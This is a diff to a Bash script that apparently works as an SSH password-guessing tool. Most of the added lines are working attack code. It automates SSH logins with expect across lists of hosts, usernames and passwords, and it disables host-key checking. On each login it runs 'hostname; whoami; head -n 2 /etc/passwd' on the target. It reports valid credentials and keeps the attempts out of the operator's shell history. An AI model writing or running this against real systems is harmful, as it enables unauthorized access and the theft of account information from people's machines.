@@ -3,8 +3,9 @@
 # *** Source library functions ***
 
 . ./lib-cecho.sh      2>/dev/null
-. ./lib-expand_ips.sh 2>/dev/null
 . ./lib-root_check.sh 2>/dev/null
+. ./lib-expand_ips.sh 2>/dev/null
+. ./lib-exists.sh     2>/dev/null
 
 
 # *** Configuration variables ***
@@ -44,7 +45,9 @@ print_help() {
 }
 
 
-# *** Main ***
+# *** Argument parsing ***
+
+# Boilerplate from: https://stackoverflow.com/questions/192249/how-do-i-parse-command-line-arguments-in-bash
 
 # Command-line argument parsing
 # Reference: https://stackoverflow.com/a/29754866
@@ -72,6 +75,7 @@ fi
 # read getopt’s output this way to handle the quoting right:
 eval set -- "$PARSED"
 
+# Command-line argument values
 target=""
 target_file=""
 user="$DEFAULT_USER"
@@ -130,7 +134,7 @@ done
 target="$1"
 
 # Ensure all mandatory arguments are provided
-if [ -z "$target" ] && [ -z "$targets_file"]; then
+if [ -z "$target" ] && [ -z "$targets_file" ]; then
 	cecho error "Must provide a target or targets file"
 	invalid_usage=true
 fi
@@ -151,24 +155,30 @@ if [ "$invalid_usage" = true ]; then
 fi
 
 
+# *** Process command-line arguments ***
+
+# Print the ASCII banner
 [ $print_banner = true ] && echo -e "$BANNER"
 
 target_list=""
 user_list=""
 password_list=""
 
+# If single target
 if [ -n "$target" ]; then
 	target_list=$(expand_ips "$target")
 	if [ $? -ne 0 ]; then
 		cecho error "Nmap is unable to parse '$target' as a valid target or target range"
 		exit 1
 	fi
-else # at this point targets_file must be defined
+else # At this point, must be a targets file
+	# Check if file exists
 	if [ ! -f "$targets_file" ]; then
 		cecho error "Targets file '$targets_file' does not exist"
 		exit 1
 	fi
 
+	# Check if file is readable
 	if [ ! -r "$targets_file" ]; then
 		cecho error "Unable to read targets file '$targets_file'"
 		exit 1
@@ -177,14 +187,17 @@ else # at this point targets_file must be defined
 	target_list=$(cat "$targets_file")
 fi
 
+# If single user
 if [ -n "$user" ]; then
 	user_list="$user"
-else # at this point users_file must be defined
+else # At this point, must be a users file
+	# Check if file exists
 	if [ ! -f "$users_file" ]; then
 		cecho error "Users file '$users_file' does not exist"
 		exit 1
 	fi
 
+	# Check if file is readable
 	if [ ! -r "$users_file" ]; then
 		cecho error "Unable to read users file '$users_file'"
 		exit 1
@@ -193,14 +206,17 @@ else # at this point users_file must be defined
 	user_list=$(cat "$users_file")
 fi
 
+# If single password
 if [ -n "$password" ]; then
 	password_list="$password"
-else # at this point passwords_file must be defined
+else # At this point, must be a passwords file
+	# Check if file exists
 	if [ ! -f "$passwords_file" ]; then
 		cecho error "Passwords file '$passwords_file' does not exist"
 		exit 1
 	fi
 
+	# Check if file is readable
 	if [ ! -r "$passwords_file" ]; then
 		cecho error "Unable to read passwords file '$passwords_file'"
 		exit 1
@@ -209,16 +225,135 @@ else # at this point passwords_file must be defined
 	password_list=$(cat "$passwords_file")
 fi
 
-cecho info "Attempting logins..."
+
+# *** Main ***
+
+cecho task "Attempting Logins"
+
+# Ensure 'expect' is present
+if ! exists expect; then
+	cecho error "'expect' not found, exiting"
+	exit 1
+fi
+
+commands="hostname; whoami; head -n 2 /etc/passwd"
+
+# Iterate over ever possible login
 for t in $target_list; do
 	for u in $user_list; do
 		for p in $password_list; do
-			echo "$u:$p @ $t"
+
+			cecho log "$u:$p @ $t"
+			cecho sep "-"
+
+			creds_format="$u : $p @ [$t]"
+			successful_login=false
+
+			# Below expect code assisted by:
+			# - https://linuxaria.com/howto/2-practical-examples-of-expect-on-the-linux-cli
+			# - https://serverfault.com/questions/241588/how-to-automate-ssh-login-with-password
+
+			# --- Automatic SSH login and command execution using expect
+			# Don't save expect commands to our .bash_history since it would expose
+			# credentials
+			export HISTIGNORE="expect*"
+			# Read `man expect` to learn more; there's a lot of detail
+
+			# expect has weird issues for SSH when ran on CentOS systems like no
+			# command results being printed to stdout. Replace with 'sshpass' or
+			# 'runoverssh' instead? Look into alternatives.
+			expect <<- EOD
+				# The value of timeout must be an integral number of seconds.
+				# Normally timeouts are nonnegative, but the special case of -1
+				# signifies that expect #should wait forever.
+				set timeout 15
+
+				# Don't print send/expect dialogue to stdout
+				#log_user 0
+
+				# Now we can connect to the remote server/port with our username and
+				# password. The command spawn is used to execute another process:
+				spawn -noecho ssh -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectionAttempts=2 -o ConnectTimeout=2 -o ServerAliveInterval=2 -o ServerAliveCountMax=2 $u@$t "$commands"
+
+				# Now we expect to have a request for password:
+				expect {
+					"?assword:" { # Valid host
+						# At this point we want to see stdout
+						#log_user 1
+
+						# And we send our password:
+						send -- "$p\r"
+
+						# Check for invalid password
+						expect_background "?ermission denied" {
+							exit 1
+						}
+
+						# send blank line (\r) to make sure we get back to cli
+						send -- "\r"
+
+						# No need to 'exit' the SSH session. We've already exited our
+						# commands, so the server will close the connection for us.
+
+						# In this block we can specify any final actions to carry out,
+						# though we don't want to in this case:
+						# (Note: It also seems like CentOS boxes don't trigger an EOF when
+						#        the session is closed? They also still print out the
+						#        password prompt to stdout, necessitating the earlier
+						#        'log_user 0' statement.)
+						#expect eof
+					} "?ermission denied" {
+						exit 2
+					} "*timed out" {
+						exit 3
+					} "unreachable" { # Invalid host
+						exit 4
+					} "not resolve hostname" { # Invalid host
+						exit 5
+					}
+				}
+			EOD
+
+			expect_exit_code=$?
+
+			cecho sep "-"
+
+			# Check the exit status of the SSH login and command execution
+			case $expect_exit_code in
+				0)
+					cecho info "Valid credentials! $creds_format"
+					successful_login=true
+					;;
+				1)
+					cecho warning "Invalid credentials: $creds_format"
+					;;
+				2)
+					cecho warning "Password authentication disabled: [$t]"
+					;;
+				3)
+					cecho warning "Connection timed out: [$t]"
+					;;
+				4)
+					cecho warning "Unreachable host: [$t]"
+					;;
+				5)
+					cecho warning "Could not resolve target: [$t]"
+					;;
+				*)
+					cecho error "Unrecognized exit code, programming error: $creds_format"
+					;;
+			esac
+
+			# Reset HISTIGNORE
+			export HISTIGNORE=""
+
+			test $successful_login = true && break
+
 		done
 	done
 done
 
+cecho done "Done!"
+
 
 #echo "target: '$target', targets_file: '$targets_file', user: '$user', users_file: '$users_file', password: '$password', passwords_file: '$passwords_file', in: '$1'"
-
-
